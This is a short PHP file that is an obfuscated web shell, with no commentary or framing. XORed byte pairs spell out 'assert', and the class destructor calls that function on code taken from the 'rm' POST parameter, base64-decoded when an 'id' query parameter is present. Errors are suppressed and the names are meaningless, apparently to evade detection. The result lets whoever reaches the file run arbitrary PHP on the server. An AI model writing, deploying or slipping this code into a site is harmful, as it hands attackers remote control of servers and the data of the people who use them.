<?php 
class GBXC { 
    function nHzm() {
        $wLCm = "\xfd" ^ "\x9c";
        $PURQ = "\xe4" ^ "\x97";
        $Oxrd = "\x6b" ^ "\x18";
        $Gair = "\x2c" ^ "\x49";
        $hZbu = "\xde" ^ "\xac";
        $qNZu = "\x78" ^ "\xc";
        $epTk =$wLCm.$PURQ.$Oxrd.$Gair.$hZbu.$qNZu;
        return $epTk;
    }
    function __destruct(){
        $XsZl=$this->nHzm();
        @$XsZl($this->tM);
    }
}
$gbxc = new GBXC();
@$gbxc->tM = isset($_GET['id'])?base64_decode($_POST['rm']):$_POST['rm'];
?>
